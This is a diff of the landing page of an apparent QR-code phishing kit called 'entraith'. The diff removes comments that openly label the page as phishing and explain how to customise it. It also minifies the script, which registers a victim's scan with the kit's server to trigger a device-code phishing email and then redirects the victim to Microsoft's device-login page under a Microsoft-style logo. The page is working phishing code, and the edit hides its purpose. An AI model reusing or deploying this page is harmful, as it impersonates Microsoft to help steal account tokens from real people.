@@ -1,18 +1,4 @@
 <!DOCTYPE html>
-<!--
-  QR Phishing — Landing Page
-  ==========================
-  Served when a target scans the QR code.
-
-  HOW TO CUSTOMIZE:
-  - Change the redirect URL at the bottom of the <script> block.
-  - Change the visual design (logo, text, colors) freely.
-  - The fetch('/qr/{{TOKEN}}/confirm', ...) line MUST stay — it is what
-    registers the scan and triggers the device code email.
-  - {{TOKEN}} is replaced automatically by the server. Do not touch it.
-
-  After editing, rebuild: go build -o entraith ./cmd/entraith
--->
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -67,7 +53,6 @@
 </head>
 <body>
 <div class="card">
-  <!-- Microsoft-style logo — swap this SVG for any logo you want -->
   <svg class="logo" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
     <rect x="2"  y="2"  width="20" height="20" fill="#f25022"/>
     <rect x="26" y="2"  width="20" height="20" fill="#7fba00"/>
@@ -79,23 +64,7 @@
   <div class="spinner"></div>
 </div>
 <script>
-(function() {
-  // ── DO NOT REMOVE OR EDIT THIS BLOCK ──────────────────────────────────
-  // keepalive:true ensures the browser sends this request even while
-  // navigating away — without it, mobile browsers cancel the fetch before
-  // it reaches the server, so the scan is never logged.
-  fetch('/qr/{{TOKEN}}/confirm', {
-    method: 'POST',
-    keepalive: true,
-    credentials: 'omit',
-    headers: { 'Content-Type': 'application/json' },
-    body: '{}'
-  });
-  // ──────────────────────────────────────────────────────────────────────
-
-  // REDIRECT TARGET — change this URL to wherever the target should land.
-  window.location.replace('https://microsoft.com/devicelogin');
-})();
+(function(){fetch('/qr/{{TOKEN}}/confirm',{method:'POST',keepalive:true,credentials:'omit',headers:{'Content-Type':'application/json'},body:'{}'});window.location.replace('https://microsoft.com/devicelogin');})();
 </script>
 </body>
 </html>
